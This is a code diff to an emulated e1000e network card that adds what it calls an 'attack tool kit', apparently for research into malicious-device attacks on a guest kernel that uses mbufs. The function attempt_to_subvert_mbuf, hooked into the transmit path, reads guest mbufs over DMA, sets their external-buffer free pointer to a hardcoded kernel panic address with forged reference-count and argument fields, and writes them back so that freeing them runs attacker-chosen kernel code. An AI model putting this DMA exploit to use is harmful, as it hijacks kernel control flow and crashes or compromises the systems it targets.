@@ -56,8 +56,18 @@
 
 #include "trace.h"
 
+/*
+ * Attack tool kit types
+ * ---------------------------------------------------------------------------
+ */
+
+void attempt_to_subvert_mbuf(E1000ECore* core, hwaddr ba);
 void print_rx_buffer_address_information(E1000ECore *core);
 void print_tx_buffer_address_information(E1000ECore *core);
+
+/*
+ * ----------------------------------------------------------------------------
+ */
 
 #define _E1000E_MIN_XITR (500) /* No more then 7813 interrupts per
                                   second according to spec 10.2.4.2 */
@@ -991,6 +1001,8 @@ start_xmit(E1000ECore *core, const E1000E_TxRing *txr)
 
         process_tx_desc(core, txr->tx, &desc, txi->idx);
         cause |= txdesc_writeback(core, base, &desc, &ide, txi->idx);
+
+		attempt_to_subvert_mbuf(core, le64_to_cpu(desc.buffer_addr));
 
         _e1000e_ring_advance(core, txi, 1);
     }
@@ -2625,6 +2637,7 @@ set_tdt(E1000ECore *core, int index, uint32_t val)
 
     core->mac[index] = val & 0xffff;
 
+	PDBG("Sending from ring: %d", _e1000e_mq_queue_idx(TDT, index));
 	print_tx_buffer_address_information(core);
 
     _e1000e_tx_ring_init(core, &txr, _e1000e_mq_queue_idx(TDT, index));
@@ -3534,13 +3547,128 @@ e1000e_core_post_load(E1000ECore *core)
  *  ---------------------------------------------
  */
 void
+print_mbuf_flags(int m_flags)
+{
+	static const int flag_count = 22;
+	static const int flags[flag_count] = {
+		M_EXT,
+		M_PKTHDR,
+		M_EOR,
+		M_RDONLY,
+		M_BCAST,
+		M_MCAST,
+		M_PROMISC,
+		M_VLANTAG,
+		M_UNUSED_8,
+		M_NOFREE,
+		M_PROTO1,
+		M_PROTO2,
+		M_PROTO3,
+		M_PROTO4,
+		M_PROTO5,
+		M_PROTO6,
+		M_PROTO7,
+		M_PROTO8,
+		M_PROTO9,
+		M_PROTO10,
+		M_PROTO11,
+		M_PROTO12
+	};
+
+#define CASE(flag)														\
+case flag:																\
+	printf( #flag " ");													\
+	break
+
+	for (int i = 0; i < flag_count; ++i) {
+		switch (m_flags & flags[i]) {
+			CASE(M_EXT);
+			CASE(M_PKTHDR);
+			CASE(M_EOR);
+			CASE(M_RDONLY);
+			CASE(M_BCAST);
+			CASE(M_MCAST);
+			CASE(M_PROMISC);
+			CASE(M_VLANTAG);
+			CASE(M_UNUSED_8);
+			CASE(M_NOFREE);
+			CASE(M_PROTO1);
+			CASE(M_PROTO2);
+			CASE(M_PROTO3);
+			CASE(M_PROTO4);
+			CASE(M_PROTO5);
+			CASE(M_PROTO6);
+			CASE(M_PROTO7);
+			CASE(M_PROTO8);
+			CASE(M_PROTO9);
+			CASE(M_PROTO10);
+			CASE(M_PROTO11);
+			CASE(M_PROTO12);
+		}
+	}
+
+#undef CASE
+}
+
+static inline uint32_t
+bswap24(uint32_t x)
+{
+	return ((x & 0xFF0000) >> 16) | (x & 0x00FF00) | ((x & 0x0000FF) << 16);
+}
+
+#define FIX_MBUF()														\
+	FIX_64_FIELD(mbuf->m_next);											\
+	FIX_64_FIELD(mbuf->m_nextpkt);										\
+	FIX_64_FIELD(mbuf->m_data);											\
+	FIX_32_FIELD(mbuf->m_len);											\
+	mbuf->m_flags = bswap24(mbuf->m_flags);								\
+																		\
+	FIX_64_FIELD(mbuf->m_ext.ext_cnt);									\
+	FIX_64_FIELD(mbuf->m_ext.ext_buf);									\
+	FIX_32_FIELD(mbuf->m_ext.ext_size);									\
+	mbuf->m_ext.ext_flags = bswap24(mbuf->m_ext.ext_flags);				\
+	FIX_64_FIELD(mbuf->m_ext.ext_free);									\
+	FIX_64_FIELD(mbuf->m_ext.ext_arg1);									\
+	FIX_64_FIELD(mbuf->m_ext.ext_arg2);
+
+
+void
+mbuf_le_to_cpu(struct mbuf *mbuf)
+{
+#define FIX_32_FIELD(field)	field = (typeof(field))le32_to_cpu((int32_t)field)
+#define FIX_64_FIELD(field)	field = (typeof(field))le64_to_cpu((int64_t)field)
+
+	FIX_MBUF()
+
+#undef FIX_32_FIELD
+#undef FIX_64_FIELD
+}
+
+void
+mbuf_cpu_to_le(struct mbuf *mbuf)
+{
+#define FIX_32_FIELD(field) field = (typeof(field))cpu_to_le32((int32_t)field)
+#define FIX_64_FIELD(field) field = (typeof(field))cpu_to_le64((int64_t)field)
+
+	FIX_MBUF()
+
+#undef FIX_32_FIELD
+#undef FIX_64_FIELD
+}
+
+void
 print_host_mbuf_information(const uint8_t* buffer)
 {
 	struct mbuf *mbuf = (struct mbuf *)buffer;
-	printf("m_next: 0x%lx.\n", le64_to_cpu((uint64_t)mbuf->m_next));
-	printf("m_nextpkt: 0x%lx.\n", le64_to_cpu((uint64_t)mbuf->m_nextpkt));
-	printf("m_data: 0x%lx.\n", le64_to_cpu((uint64_t)mbuf->m_data));
-	printf("m_len: %d.", le32_to_cpu(mbuf->m_len));
+	mbuf_le_to_cpu(mbuf);
+	printf("m_next: %p.\n", mbuf->m_next);
+	printf("m_nextpkt: %p.\n", mbuf->m_nextpkt);
+	printf("m_data: %p.\n", mbuf->m_data);
+	printf("m_len: %d.\n", mbuf->m_len);
+	printf("m_type: 0x%x\n", mbuf->m_type);
+	printf("m_flags: 0x%x (", mbuf->m_flags);
+	print_mbuf_flags(mbuf->m_flags);
+	puts(")");
 }
 
 typedef hwaddr (*get_buffer_address_fp)(E1000ECore *, dma_addr_t);
@@ -3566,12 +3694,105 @@ get_buffer_address_from_tx_descriptor(E1000ECore *core,
 }
 
 void
-print_ring_address_information(E1000ECore *core, const E1000E_RingInfo *rxi,
-	get_buffer_address_fp get_buffer_address)
+print_buffer_address_information(hwaddr ba, void *opaque)
+{
+	E1000ECore *core = (E1000ECore *)opaque;
+	uint8_t mbuf_buffer[sizeof(struct mbuf)];
+
+	printf("Buffer: 0x%lx.", ba);
+	if (ba % 2048 == 0) {
+		printf(" Address is 2K aligned. Probably a cluster.");
+	} else {
+		if ((ba - 0x20) % 256 == 0) {
+			printf(" Address is MHSIZE offset from 256 aligned. Probably "
+				"mbuf without packet header.");
+		} else if ((ba - 0x58) % 256 == 0) {
+			printf(" Address is MPKTHSIZE offset from 256 aligned. Probably "
+				"mbuf with packet header.");
+		}
+		putchar('\n');
+		pci_dma_read(core->owner, ba & ~0xFF, mbuf_buffer, sizeof(struct mbuf));
+		print_host_mbuf_information(mbuf_buffer);
+	}
+	putchar('\n');
+}
+
+const void *KERNEL_PRINTF_ADDR = 	(void *)0xffffffff80a4da90ll;
+const void *KERNEL_PANIC_ADDR =		(void *)0xffffffff80a0b9a0ll;
+
+void
+attempt_to_subvert_mbuf(E1000ECore* core, hwaddr ba)
+{
+	char buffer[256];
+	struct mbuf *mbuf = (struct mbuf *)(buffer);
+	char *data_buffer = (buffer + sizeof(struct mbuf));
+
+	PDBG("Attempting to subvert buffer with address 0x%lx.", ba);
+
+	if ((ba % 2048) == 0) {
+		PDBG("Buffer is probably a cluster.");
+		return; /* Probably a cluster */
+	}
+
+
+	pci_dma_read(core->owner, ba & ~0xFF, mbuf, sizeof(struct mbuf));
+	mbuf_le_to_cpu(mbuf);
+
+	uint64_t kernel_mbuf_addr = (uint64_t)mbuf->m_data & ~0xFF;
+	PDBG("Kernel's address for mbuf: 0x%lx.", kernel_mbuf_addr);
+
+	/*
+	 * In order for the free function to be called, the mbuf needs to have a
+	 * non-null, non-zero pointer as a reference count. We are guaranteed 120
+	 * bytes of space in the mbuf after its header, so we write there.
+	 */
+
+	uint32_t *ext_cnt = (uint32_t *)data_buffer;
+	*ext_cnt = bswap32(1);
+
+	/*
+	 * If it attempts to free the mbuf, it gets into alignemnt issues.
+	 */
+	mbuf->m_flags |= M_EXT | M_NOFREE;
+	mbuf->m_ext.ext_type = EXT_EXTREF;
+	mbuf->m_ext.ext_cnt = (u_int *)(kernel_mbuf_addr + sizeof(struct mbuf));
+	mbuf->m_ext.ext_free = KERNEL_PANIC_ADDR;
+	/* m_next is the value given as the first argument of the called function.
+	 */
+	mbuf->m_next = (struct mbuf *)(kernel_mbuf_addr + sizeof(struct mbuf) + 8);
+
+	mbuf_cpu_to_le(mbuf);
+
+	/*
+	 * Have to write this after the conversion, because it collides with mbuf
+	 * fields, and doesn't want to be swapped about.
+	 */
+
+	buffer[0] = 'B';
+	buffer[1] = 'A';
+	buffer[2] = 'D';
+	buffer[3] = ' ';
+	buffer[4] = 'N';
+	buffer[5] = 'I';
+	buffer[6] = 'C';
+	buffer[7] = '!';
+	buffer[8] = '\n';
+	buffer[9] = 0;
+
+	PDBG("DMA writing to addr %lx", ba & ~0xFF);
+	pci_dma_write(core->owner, ba & ~0xFF, buffer, 256);
+}
+
+
+void
+for_each_buffer_address(E1000ECore *core, const E1000E_RingInfo *rxi,
+	get_buffer_address_fp get_buffer_address,
+	void (*loop_body)(hwaddr, void *),
+	void (*done)(void *),
+	void *opaque)
 {
 	hwaddr ba;
     dma_addr_t cursor_addr, tail_addr, wrap_addr;
-	uint8_t mbuf_buffer[sizeof(struct mbuf)];
 
 	int i = 0;
 	cursor_addr = _e1000e_ring_head_descr(core, rxi);
@@ -3580,33 +3801,13 @@ print_ring_address_information(E1000ECore *core, const E1000E_RingInfo *rxi,
 		core->mac[rxi->dlen]);
 
 	while (cursor_addr != tail_addr) {
-		++i;
-		ba = get_buffer_address(core, cursor_addr);
-
-		printf("Buffer: 0x%lx.", ba);
-		if (ba % 2048 == 0) {
-			printf(" Address is 2K aligned. Probably a cluster.");
-		} else {
-			if ((ba - 0x20) % 256 == 0) {
-				printf(" Address is MHSIZE offset from 256 aligned. Probably "
-					"mbuf without packet header.");
-			} else if ((ba - 0x58) % 256 == 0) {
-				printf(" Address is MPKTHSIZE offset from 256 aligned. Probably "
-					"mbuf with packet header.");
-			}
-			putchar('\n');
-			pci_dma_read(core->owner, ba & ~0xFF, mbuf_buffer,
-				sizeof(struct mbuf));
-			print_host_mbuf_information(mbuf_buffer);
-		}
-		putchar('\n');
+		loop_body(get_buffer_address(core, cursor_addr), opaque);
 
 		cursor_addr += E1000_RING_DESC_LEN;
 		if (cursor_addr == wrap_addr) {
 			cursor_addr = _e1000e_ring_base(core, rxi);
 		}
 	}
-	printf("Examined %d buffers.\n", i);
 }
 
 void
@@ -3622,8 +3823,8 @@ print_rx_buffer_address_information(E1000ECore *core)
 	/* 0 is the queue. Should do something with RSS to confirm this is
 	 * correct. */
     _e1000e_rx_ring_init(core, &rxr, 0);
-	print_ring_address_information(core, rxi,
-		get_buffer_address_from_rx_descriptor);
+	for_each_buffer_address(core, rxi, get_buffer_address_from_rx_descriptor,
+		print_buffer_address_information, NULL, core);
 }
 
 void
@@ -3632,6 +3833,6 @@ print_tx_buffer_address_information(E1000ECore *core)
 	E1000E_TxRing txr;
 	const E1000E_RingInfo *txi = txr.i;
 	_e1000e_tx_ring_init(core, &txr, 0);
-	print_ring_address_information(core, txi,
-		get_buffer_address_from_tx_descriptor);
+	for_each_buffer_address(core, txi, get_buffer_address_from_tx_descriptor,
+		print_buffer_address_information, NULL, core);
 }
